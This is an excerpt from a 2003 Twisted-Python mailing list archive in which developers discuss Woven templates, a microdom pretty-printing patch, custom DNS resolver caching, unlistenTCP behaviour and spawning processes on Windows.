Subject: [Twisted-Python] quick factory question
In-Reply-To: <20030722123829.739ae1d6.itamar@itamarst.org>
References: <200307220932.21459.lists@gregfortune.com> <20030722123829.739ae1d6.itamar@itamarst.org>
Message-ID: <200307221023.06543.lists@gregfortune.com>

On Tuesday 22 July 2003 09:38 am, Itamar Shtull-Trauring wrote:
> On Tue, 22 Jul 2003 09:32:21 -0700
>
> Greg Fortune <lists at gregfortune.com> wrote:
> > On a related note, I've noticed that twisted uses naming similar to
> > that of the Designs pattern books.  Anyone know of a good online
> > resource for the design patterns covered by "the gang of four" (ie,
> > the ones twisted appears to be using...)?
>
> The "gang of four" patterns are usually idioms in Python, so their book
> is not very interesting.
>
> For networking-oriented patterns you should probably look at
> http://www.cs.wustl.edu/~schmidt/ACE-papers.html
>
> You may want to read the POSA2 book as well, since it is based on these
> papers.

Wow, thanks for some good reading material ;o)

Greg




From mesozoic at polynode.com  Tue Jul 22 13:18:49 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Tue, 22 Jul 2003 19:18:49 +0000
Subject: [Twisted-Python] another woven question
In-Reply-To: <20030722164619.D654E39468@www.fastmail.fm>
References: <20030722164619.D654E39468@www.fastmail.fm>
Message-ID: <20030722191849.GB282@perpetual.moxn.net>

Every template file needs to contain one root element.
So instead of templateX.html being:

  <h1>Something</h1>
  <p>Foo!</p>
  
..you should make it:

  <div>
    <h1>Something</h1>
    <p>Foo!</p>
  </div>
 
Another useful bit of code you may want to use is called ExpandMacro, and is
detailed in a previous post:
http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/004662.html

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From justinjohnson at fastmail.fm  Tue Jul 22 14:42:49 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 14:42:49 -0600
Subject: [Twisted-Python] another woven question
In-Reply-To: <20030722191849.GB282@perpetual.moxn.net>
References: <20030722164619.D654E39468@www.fastmail.fm> <20030722191849.GB282@perpetual.moxn.net>
Message-ID: <20030722204249.77508196A@www.fastmail.fm>

Excellent!  Thank you!

On Tue, 22 Jul 2003 19:18:49 +0000, "Alex Levy" <mesozoic at polynode.com>
said:
> Every template file needs to contain one root element.
> So instead of templateX.html being:
> 
>   <h1>Something</h1>
>   <p>Foo!</p>
>   
> ..you should make it:
> 
>   <div>
>     <h1>Something</h1>
>     <p>Foo!</p>
>   </div>
>  
> Another useful bit of code you may want to use is called ExpandMacro, and
> is
> detailed in a previous post:
> http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/004662.html
> 
> -- 
> Alex Levy
> WWW: http://mesozoic.geecs.org
>  
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From mesozoic at polynode.com  Tue Jul 22 18:25:21 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Wed, 23 Jul 2003 00:25:21 +0000
Subject: [Twisted-Python] Pretty printing in Woven
Message-ID: <20030723002521.GC282@perpetual.moxn.net>

Attached is a diff for pretty-printing HTML in Woven.  I removed strip=1
from microdom.toprettyxml because it was senselessly munging whitespace; I
couldn't think of a good reason to keep this in, since dumping out huge
blocks of text in a single line never makes readable code.

The rest of it works, but others may have better ideas for how to do this.


Index: twisted/web/microdom.py
===================================================================
RCS file: /cvs/Twisted/twisted/web/microdom.py,v
retrieving revision 1.95
diff -u -r1.95 microdom.py
--- twisted/web/microdom.py	19 Jul 2003 02:09:50 -0000	1.95
+++ twisted/web/microdom.py	22 Jul 2003 04:17:56 -0000
@@ -137,10 +137,10 @@
         rv = s.getvalue()
         return rv
 
-    def writeprettyxml(self, stream, indent='', addindent=' ', newl='\n', strip=1):
+    def writeprettyxml(self, stream, indent='', addindent=' ', newl='\n', strip=0):
         return self.writexml(stream, indent, addindent, newl, strip)
 
-    def toprettyxml(self, indent='', addindent=' ', newl='\n', strip=1):
+    def toprettyxml(self, indent='', addindent=' ', newl='\n', strip=0):
         return self.toxml(indent, addindent, newl, strip)
 
     def cloneNode(self, deep=0, parent=None):
@@ -477,6 +477,13 @@
         ALLOWSINGLETON = ('img', 'br', 'hr', 'base', 'meta', 'link', 'param',
                           'area', 'input', 'col', 'basefont', 'isindex',
                           'frame')
+        BLOCKELEMENTS = ('html', 'head', 'body', 'noscript', 'ins', 'del',
+                         'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'script',
+                         'ul', 'ol', 'dl', 'pre', 'hr', 'blockquote',
+                         'address', 'p', 'div', 'fieldset', 'table', 'tr',
+                         'form', 'object', 'fieldset', 'applet', 'map')
+        FORMATNICELY = ('tr', 'ul', 'ol', 'head')
+
         # this should never be necessary unless people start
         # changing .tagName on the fly(?)
         if not self.preserveCase:
@@ -487,8 +494,11 @@
             for ns in nsprefixes.keys():
                 del newprefixes[ns]
         else:
-             newprefixes = {}   
-        begin = [newl, indent, '<']
+             newprefixes = {}
+
+        begin = ['<']
+        if self.tagName in BLOCKELEMENTS:
+            begin = [newl, indent] + begin
         bext = begin.extend
         writeattr = lambda _atr, _val: bext((' ', _atr, '="', escape(_val), '"'))
         if namespace != self.namespace:
@@ -525,8 +535,14 @@
             w(">")
             newindent = indent + addindent
             for child in self.childNodes:
+                if self.tagName in BLOCKELEMENTS and \
+                   self.tagName in FORMATNICELY:
+                    w(j((newl, newindent)))
                 child.writexml(stream, newindent, addindent, newl, strip, downprefixes, self.namespace)
-            w(j((newl, indent, "</", self.endTagName, '>')))
+            if self.tagName in BLOCKELEMENTS:
+                w(j((newl, indent)))
+            w(j(("</", self.endTagName, '>')))
+            
         elif self.tagName.lower() not in ALLOWSINGLETON:
             w(j(('></', self.endTagName, '>')))
         else:
Index: twisted/web/woven/utils.py
===================================================================
RCS file: /cvs/Twisted/twisted/web/woven/utils.py,v
retrieving revision 1.14
diff -u -r1.14 utils.py
--- twisted/web/woven/utils.py	13 May 2003 00:57:18 -0000	1.14
+++ twisted/web/woven/utils.py	22 Jul 2003 04:17:56 -0000
@@ -15,7 +15,7 @@
 
 
 def doSendPage(self, d, request):
-    page = str(d.toxml())
+    page = str(d.toprettyxml())
     request.setHeader('content-length', str(len(page)))
     request.write(page)
     request.finish()



-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From lafou at wanadoo.fr  Wed Jul 23 00:11:27 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 23 Jul 2003 08:11:27 +0200
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723002521.GC282@perpetual.moxn.net>
References: <20030723002521.GC282@perpetual.moxn.net>
Message-ID: <1058940687.18977.1.camel@biproc>

On Wed, 2003-07-23 at 02:25, Alex Levy wrote:
> Attached is a diff for pretty-printing HTML in Woven.  I removed strip=1
> from microdom.toprettyxml because it was senselessly munging whitespace; I
> couldn't think of a good reason to keep this in, since dumping out huge
> blocks of text in a single line never makes readable code.


Good idea ! I wanted to work on this this week.
you're faster than me, so thanks a lot :)




From rudy.schockaert at pandora.be  Wed Jul 23 05:12:27 2003
From: rudy.schockaert at pandora.be (rudy.schockaert at pandora.be)
Date: Wed 23 Jul 2003 13:12:27 +0200
Subject: [Twisted-Python] Custom DNS server
Message-ID: <20030723111227.CAF8449DB1@euros.telenet-ops.be>

Hi,

I need a DNS server that forwards all queries except for some predefined maildomains. For these domains a record pointing to a central mailrelay should be returned instead of the record that is present in Internet DNS.

Is this possible/difficult to do with Twisted?

How should I interpret the 'unstable' in the twisted.names documentation?

TIA,

Rudy




From glyph at twistedmatrix.com  Wed Jul 23 06:45:02 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 23 Jul 2003 07:45:02 -0500
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723002521.GC282@perpetual.moxn.net>
Message-ID: <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>

On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:

> Attached is a diff for pretty-printing HTML in Woven.

Is this in the bugtracker someplace?




From mesozoic at polynode.com  Wed Jul 23 08:23:34 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Wed, 23 Jul 2003 14:23:34 +0000
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>
References: <20030723002521.GC282@perpetual.moxn.net> <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030723142334.GD282@perpetual.moxn.net>

On Wed, Jul 23, 2003 at 07:45:02AM -0500, Glyph Lefkowitz wrote:
> 
> On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:
> 
> >Attached is a diff for pretty-printing HTML in Woven.
> 
> Is this in the bugtracker someplace?

No, it's not -- I can add it if you'd like ;)

The only reason I'm posting it here is that I've been using it for weeks
already, and I wanted to see if people thought it was worth including.  I
know it's not an urgent bugfix, but I'm not really good at those anyways.

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From exarkun at twistedmatrix.com  Wed Jul 23 08:35:38 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Wed, 23 Jul 2003 10:35:38 -0400
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723111227.CAF8449DB1@euros.telenet-ops.be>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be>
Message-ID: <20030723143538.GA4915@intarweb.us>

On Wed, Jul 23, 2003 at 11:15:39AM +0000, rudy.schockaert at pandora.be wrote:
> Hi,
> 
> I need a DNS server that forwards all queries except for some predefined
> maildomains. For these domains a record pointing to a central mailrelay
> should be returned instead of the record that is present in Internet DNS.
> 
> Is this possible/difficult to do with Twisted?

  This should be pretty easy.  I think the way to go about it would be to
subclass t.names.client.Resolver and override lookupMailExchange(),
returning the central relay address instead for the affected domains, and
deferring (english meaning) to the parent implementation of the method for
everyone else.

> 
> How should I interpret the 'unstable' in the twisted.names documentation?

  It refers to the API stability -- meaning the modules haven't reached a
point where the developers are confident that no further changes which break
user code relyong on the module will be made.  It doesn't reflect on how
well the code actually works.

  Jp

-- 
"One World, one Web, one Program." - Microsoft(R) promotional ad
"Ein Volk, ein Reich, ein Fuhrer." - Adolf Hitler
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030723/dd32bf41/attachment.sig>

From justinjohnson at fastmail.fm  Wed Jul 23 08:42:37 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 23 Jul 2003 08:42:37 -0600
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723142334.GD282@perpetual.moxn.net>
References: <20030723002521.GC282@perpetual.moxn.net> <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com> <20030723142334.GD282@perpetual.moxn.net>
Message-ID: <20030723144237.3E5A8390BC@www.fastmail.fm>

This is so newlines aren't stripped in the output, right?  If so I
personally think it is well worth patching.  The output is so hard to
read currently without the newlines.

-Justin

On Wed, 23 Jul 2003 14:23:34 +0000, "Alex Levy" <mesozoic at polynode.com>
said:
> On Wed, Jul 23, 2003 at 07:45:02AM -0500, Glyph Lefkowitz wrote:
> > 
> > On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:
> > 
> > >Attached is a diff for pretty-printing HTML in Woven.
> > 
> > Is this in the bugtracker someplace?
> 
> No, it's not -- I can add it if you'd like ;)
> 
> The only reason I'm posting it here is that I've been using it for weeks
> already, and I wanted to see if people thought it was worth including.  I
> know it's not an urgent bugfix, but I'm not really good at those anyways.
> 
> -- 
> Alex Levy
> WWW: http://mesozoic.geecs.org
>  
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From justinjohnson at fastmail.fm  Wed Jul 23 10:16:51 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 23 Jul 2003 10:16:51 -0600
Subject: [Twisted-Python] Wrapping blocking code
Message-ID: <20030723161651.0355A38BBC@www.fastmail.fm>

I have some code in my xmlrpc service that executes commands using
process.py (http://starship.python.net/crew/tmick/).  The service appears
to block this code, thus only allowing one connection to get any work
done at a time, at least while the commands are being executed.  Should I
be wrapping this up in a Deferred somehow to avoid blocking?

Slowly but surely this is starting to make sense to me.  Twisted rocks!

Thanks.
-Justin



From Rudy.Schockaert at pandora.be  Wed Jul 23 10:19:57 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Wed, 23 Jul 2003 18:19:57 +0200
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723143538.GA4915@intarweb.us>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us>
Message-ID: <3F1EB5AD.4080100@pandora.be>

Jp Calderone wrote:

>On Wed, Jul 23, 2003 at 11:15:39AM +0000, rudy.schockaert at pandora.be wrote:
>  
>
>>Hi,
>>
>>I need a DNS server that forwards all queries except for some predefined
>>maildomains. For these domains a record pointing to a central mailrelay
>>should be returned instead of the record that is present in Internet DNS.
>>
>>Is this possible/difficult to do with Twisted?
>>    
>>
>
>  This should be pretty easy.  I think the way to go about it would be to
>subclass t.names.client.Resolver and override lookupMailExchange(),
>returning the central relay address instead for the affected domains, and
>deferring (english meaning) to the parent implementation of the method for
>everyone else.
>  
>
I'll give it a try this way. It doesn't seem too complicated indeed.

>  
>
>>How should I interpret the 'unstable' in the twisted.names documentation?
>>    
>>
>
>  It refers to the API stability -- meaning the modules haven't reached a
>point where the developers are confident that no further changes which break
>user code relyong on the module will be made.  It doesn't reflect on how
>well the code actually works.
>
>  Jp
>  
>
Browsing through the names package I came to the conclusion that I'd 
better not do this on Windows.

/Rudy

-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030723/511643e0/attachment.html>

From dizzyd at jabber.org  Wed Jul 23 14:42:15 2003
From: dizzyd at jabber.org (Dave Smith)
Date: Wed, 23 Jul 2003 14:42:15 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030723161651.0355A38BBC@www.fastmail.fm>
Message-ID: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sounds to me like you want to use a deferToThread(...), to pass the 
calls off to the reactor's thread pool so they can run there without 
holding up the reactor's runloop.

See also: 
http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html

Hope that helps. :)

Diz

On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson 
wrote:

> I have some code in my xmlrpc service that executes commands using
> process.py (http://starship.python.net/crew/tmick/).  The service 
> appears
> to block this code, thus only allowing one connection to get any work
> done at a time, at least while the commands are being executed.  
> Should I
> be wrapping this up in a Deferred somehow to avoid blocking?
>
> Slowly but surely this is starting to make sense to me.  Twisted rocks!
>
> Thanks.
> -Justin
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (Darwin)

iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
m830zVM1AnnL3fF76V1WHqY=
=39jf
-----END PGP SIGNATURE-----




From Rudy.Schockaert at pandora.be  Wed Jul 23 14:50:00 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Wed, 23 Jul 2003 22:50:00 +0200
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723143538.GA4915@intarweb.us>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us>
Message-ID: <3F1EF4F8.5080309@pandora.be>

Jp Calderone wrote:

>  This should be pretty easy.  I think the way to go about it would be to
>subclass t.names.client.Resolver and override lookupMailExchange(),
>returning the central relay address instead for the affected domains, and
>deferring (english meaning) to the parent implementation of the method for
>everyone else.
>  
>
Hi Jp,

I was trying to figure out how the twisted.names package works and I 
think I found a solution where I don't need to modify anything.

When I create a DNS server as follows:

mycache = {.........} # valid cache entries
ca, cl = [], []
ca.append(twisted.names.cache.CacheResolver(cache=mycache)) # preloaded 
cache
ca.append(twisted.names.cache.CacheResolver()) # regular empty cache
cl.append(twisted.names.client.createResolver())
f = twisted.names.server.DNSServerFactory(caches=ca, clients=cl)
p = twisted.protocols.dns.DNSDatagramProtocol(f)
app.listenUDP(53, p)
app.listenTCP(53, f)

I have two caches: one preloaded with my entries and a second one that 
is empty at the start.
When a request arrives for a record that is in my preloaded cache it is 
returned, but also added to the second cache (actually to the last cache 
passed to the DNSServerFactory)..
callLater in cacheResult will remove it later from the second cache but 
not from the first cache.
All other entries will follow the normal way, be it with one 
cache-lookup extra.

Is there somewhere an error in my reasoning? Are there other reasons why 
this is not a good approach?

Bet regards,

/Rudy




From exarkun at intarweb.us  Wed Jul 23 16:48:58 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Wed, 23 Jul 2003 18:48:58 -0400
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <3F1EF4F8.5080309@pandora.be>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us> <3F1EF4F8.5080309@pandora.be>
Message-ID: <20030723224858.GA11636@intarweb.us>

On Wed, Jul 23, 2003 at 10:50:00PM +0200, Rudy Schockaert wrote:
> Jp Calderone wrote:
> 
> > This should be pretty easy.  I think the way to go about it would be to
> >subclass t.names.client.Resolver and override lookupMailExchange(),
> >returning the central relay address instead for the affected domains, and
> >deferring (english meaning) to the parent implementation of the method for
> >everyone else.
> > 
> >
> Hi Jp,
> 
> [snip]
> 
> I have two caches: one preloaded with my entries and a second one that 
> is empty at the start.
> When a request arrives for a record that is in my preloaded cache it is 
> returned, but also added to the second cache (actually to the last cache 
> passed to the DNSServerFactory)..
> callLater in cacheResult will remove it later from the second cache but 
> not from the first cache.
> All other entries will follow the normal way, be it with one 
> cache-lookup extra.
> 
> Is there somewhere an error in my reasoning? Are there other reasons why 
> this is not a good approach?
> 

  This looks like a pretty good solution, actually.  I wish I'd thought of
it :)

  The only possible problem I can imagine is that the extra latency created
by the extra cache miss before most lookups may confuse some clients -- but
on a modern piece of hardware (something I don't have myself, hence my
concern about such things :), I doubt this would actually be a problem.

  Jp

-- 
"One World, one Web, one Program." - Microsoft(R) promotional ad
"Ein Volk, ein Reich, ein Fuhrer." - Adolf Hitler
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030723/7072db6b/attachment.sig>

From bob at redivi.com  Wed Jul 23 16:54:48 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 23 Jul 2003 18:54:48 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030723161651.0355A38BBC@www.fastmail.fm>
Message-ID: <A97A2DC2-BD60-11D7-9428-000A95686CD8@redivi.com>

On Wednesday, Jul 23, 2003, at 12:16 America/New_York, Justin Johnson 
wrote:

> I have some code in my xmlrpc service that executes commands using
> process.py (http://starship.python.net/crew/tmick/).  The service 
> appears
> to block this code, thus only allowing one connection to get any work
> done at a time, at least while the commands are being executed.  
> Should I
> be wrapping this up in a Deferred somehow to avoid blocking?
>
> Slowly but surely this is starting to make sense to me.  Twisted rocks!

Ideally you would convert your process.py dependent code to something 
that uses reactor.spawnProcess() with a ProcessProtocol that does what 
you need with the process.  You may still want to use process.py to do 
the argument conversion, because I don't believe this functionality is 
duplicated in Twisted.

  See: http://www.twistedmatrix.com/documents/howto/process

-bob




From golux at comcast.net  Wed Jul 23 10:35:08 2003
From: golux at comcast.net (Stephen C. Waterbury)
Date: Wed, 23 Jul 2003 12:35:08 -0400
Subject: [Twisted-Python] Patch for thinko/typo in components howto
Message-ID: <3F1EB93C.2030808@comcast.net>

The CVS version is slightly different from what's on the web, but
both have this error.  (The one that's on the web additionally has the error
that "the method definitions inside the [Interface] class block do not 
have any
self parameters", but this has of course been fixed in CVS ...)

Steve.

-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: components.html.diff
URL: </pipermail/twisted-python/attachments/20030723/455eaf5d/attachment.ksh>

From mporter at despammed.com  Thu Jul 24 11:15:28 2003
From: mporter at despammed.com (Michael Porter)
Date: Thu, 24 Jul 2003 18:15:28 +0100
Subject: [Twisted-Python] unlistenTCP not working?
Message-ID: <00de01c35207$2de818e0$0201a8c0@dan>

Hi,

I'm having a problem with unlistenTCP - it doesn't seem to work if
application.listenTCP was called after the reactor is started. Am I missing
something here or is this a bug? See test code below for demonstration...

def listen(application, port):
    from twisted.web import server, resource
    print "called listen %d" % port
    application.listenTCP(port, server.Site(resource.Resource()))

def unlisten(application, port):
    print "called unlisten %d" % port
    application.unlistenTCP(port)

def test(listenFirst):
    from twisted.python import log
    import sys
    log.startLogging(sys.stdout, 0)
    from twisted.internet import app, reactor
    application = app.Application("test")
    if listenFirst:
        listen(application, 8080)
    else:
        reactor.callLater(0, listen, application, 8080)
    reactor.callLater(5, unlisten, application, 8080)
    application.run(save=0)

If you call test(listenFirst = 1) then all works as expected (log shows it
starts listening immediately and stops after 5 secs). But if you start
listening by scheduling a call after application.run (call test(listenFirst
= 0)) the listenTCP works but when unlisten is called 5 secs later it
doesn't seem to stop listening and nothing appears in the log.

(I'm running on Windows with twisted 1.0.6)

Any ideas? Thanks,

Mike.





From warner at lothar.com  Thu Jul 24 11:40:42 2003
From: warner at lothar.com (Brian Warner)
Date: Thu, 24 Jul 2003 10:40:42 -0700 (PDT)
Subject: [Twisted-Python] Patch for thinko/typo in components howto
References: <3F1EB93C.2030808@comcast.net>
Message-ID: <20030724.104042.126595148.warner@lothar.com>

>  class IAmericanSocket(components.Interface):
> -    def voltage():
> +    def voltage(self):

Committed to CVS. Thanks!

 -Brian



From itamar at itamarst.org  Thu Jul 24 11:42:25 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 24 Jul 2003 13:42:25 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <00de01c35207$2de818e0$0201a8c0@dan>
References: <00de01c35207$2de818e0$0201a8c0@dan>
Message-ID: <20030724134225.617d4fca.itamar@itamarst.org>

On Thu, 24 Jul 2003 18:15:28 +0100
"Michael Porter" <mporter at despammed.com> wrote:

> I'm having a problem with unlistenTCP - it doesn't seem to work if
> application.listenTCP was called after the reactor is started. Am I
> missing something here or is this a bug? See test code below for
> demonstration...

In general, if you're doing unlisten, it's probably best to just use
"port = reactor.listenTCP", and "port.stopListening()" when you're done.

The idea is, application knows about stuff that is always going to be
there. If it's temporary or changes on every run, just use the reactor
directly.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From exarkun at intarweb.us  Thu Jul 24 11:55:57 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 24 Jul 2003 13:55:57 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <00de01c35207$2de818e0$0201a8c0@dan>
References: <00de01c35207$2de818e0$0201a8c0@dan>
Message-ID: <20030724175557.GA17814@intarweb.us>

On Thu, Jul 24, 2003 at 06:15:28PM +0100, Michael Porter wrote:
> Hi,
> 
> I'm having a problem with unlistenTCP - it doesn't seem to work if
> application.listenTCP was called after the reactor is started. Am I missing
> something here or is this a bug? See test code below for demonstration...
> 
> def listen(application, port):
>     from twisted.web import server, resource
>     print "called listen %d" % port
>     application.listenTCP(port, server.Site(resource.Resource()))
> 
> def unlisten(application, port):
>     print "called unlisten %d" % port
>     application.unlistenTCP(port)
> 
> def test(listenFirst):
>     from twisted.python import log
>     import sys
>     log.startLogging(sys.stdout, 0)
>     from twisted.internet import app, reactor
>     application = app.Application("test")
>     if listenFirst:
>         listen(application, 8080)
>     else:
>         reactor.callLater(0, listen, application, 8080)
>     reactor.callLater(5, unlisten, application, 8080)
>     application.run(save=0)
> 
> If you call test(listenFirst = 1) then all works as expected (log shows it
> starts listening immediately and stops after 5 secs). But if you start
> listening by scheduling a call after application.run (call test(listenFirst
> = 0)) the listenTCP works but when unlisten is called 5 secs later it
> doesn't seem to stop listening and nothing appears in the log.
> 
> (I'm running on Windows with twisted 1.0.6)
> 
> Any ideas? Thanks,
> 

  I believe this is somewhat intentional.  When the reactor is running,
listenXYZ() return Port objects which have a `stopListening' method.  It is
expected that listeners added while the application is running will have
this port object stashed away by the user code and, when the time comes,
have their `stopListening' method called.

  In practice, this can be somewhat difficult to manage, and is a good
reason to use ApplicationServices to manage listeners and connectors.

  I'm not sure if this could be "fixed", since it has behaved this way for a
long time, and some applications may depend on the behavior.

  Jp

-- 
"Minerals are inexhaustible and will never be depleted. A stream of
investment creates additions to proved reserves, a very large in-ground
inventory, constantly renewed as it is extracted... How much was in the
ground at the start and how much will be left at the end are unknown and
irrelevant."  -- Morry Adelman, World Renowned Economist
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030724/bf8f9788/attachment.sig>

From itamar at itamarst.org  Thu Jul 24 11:56:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 24 Jul 2003 13:56:08 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <20030724175557.GA17814@intarweb.us>
References: <00de01c35207$2de818e0$0201a8c0@dan>
	<20030724175557.GA17814@intarweb.us>
Message-ID: <20030724135608.7d962b43.itamar@itamarst.org>

On Thu, 24 Jul 2003 13:55:57 -0400
Jp Calderone <exarkun at intarweb.us> wrote:

>   I'm not sure if this could be "fixed", since it has behaved this way
>   for a
> long time, and some applications may depend on the behavior.

Long term fix is to deprecate app.listenTCP, of course.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From mporter at despammed.com  Fri Jul 25 02:45:33 2003
From: mporter at despammed.com (Michael Porter)
Date: Fri, 25 Jul 2003 09:45:33 +0100
Subject: [Twisted-Python] unlistenTCP not working?
References: <00de01c35207$2de818e0$0201a8c0@dan> <20030724134225.617d4fca.itamar@itamarst.org>
Message-ID: <007301c35289$1cc58610$0201a8c0@dan>

From: "Itamar Shtull-Trauring" <itamar at itamarst.org>

> On Thu, 24 Jul 2003 18:15:28 +0100
> "Michael Porter" <mporter at despammed.com> wrote:
> 
> > I'm having a problem with unlistenTCP - it doesn't seem to work if
> > application.listenTCP was called after the reactor is started. Am I
> > missing something here or is this a bug? See test code below for
> > demonstration...
> 
> In general, if you're doing unlisten, it's probably best to just use
> "port = reactor.listenTCP", and "port.stopListening()" when you're done.
> 
> The idea is, application knows about stuff that is always going to be
> there. If it's temporary or changes on every run, just use the reactor
> directly.
> 

Ok, I didn't realise listenTCP returned Port objects.

Thanks, Mike.




From justinjohnson at fastmail.fm  Fri Jul 25 08:17:52 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 08:17:52 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>
References: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>
Message-ID: <20030725141752.398A938393@www.fastmail.fm>

Since I'm running on win2k (ugh!) I followed the instructions to use
win32eventreactor instead of the default posix reactor.  I did read
through the docstrings, and it does mention that process calling can be
problematic.  I ran the code below and got the following error.  Is it
possible to get this working on windows?  It is marked as semi-stable. 
Man I hate windows!  Unfortunately the servers I support are all windows
boxes.


C:\Python22\Lib\site-packages\twisted\internet\win32eventreactor.py:198:
Depreca
tionWarning: Foolish capitalist!  Your opulent toilet will be your
undoing!!
  log.logOwner.own(fd)
C:\Python22\Lib\site-packages\twisted\internet\win32eventreactor.py:213:
Depreca
tionWarning: The proletariat is victorious.
  log.logOwner.disown(fd)


[snip]
from twisted.internet import protocol
from twisted.internet import win32eventreactor
win32eventreactor.install()
from twisted.internet import reactor

class MyProcessProtocol(protocol.ProcessProtocol):
	finished = 0

	def connectionMade(self):
		self.data = ''
		self.err = ''
		self.transport.write("connectionMade")

	def outReceived(self, data):
		self.data = self.data + data

	def outConnectionLost(self):
		self.transport.write("outConnectionLost")

	def errReceived(self, data):
		self.err = self.err + data
		self.transport.write("errReceived")

	def errConnectionLost(self):
		self.transport.write("errConnectionLost")

	def inConnectionLost(self):
		self.transport.write("inConnectionLost")

	def processEnded(self, reason):
		self.finished = 1
		self.reason = reason
		self.transport.write("processEnded")


exe = r"c:\program files\rational\clearcase\bin\cleartool.exe"
p = MyProcessProtocol()
reactor.spawnProcess(p, exe, [exe, "lsview", "-s"], env=None)
while not p.finished:
	reactor.iterate()
[/snip]


On Wed, 23 Jul 2003 14:42:15 -0600, "Dave Smith" <dizzyd at jabber.org>
said:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Sounds to me like you want to use a deferToThread(...), to pass the 
> calls off to the reactor's thread pool so they can run there without 
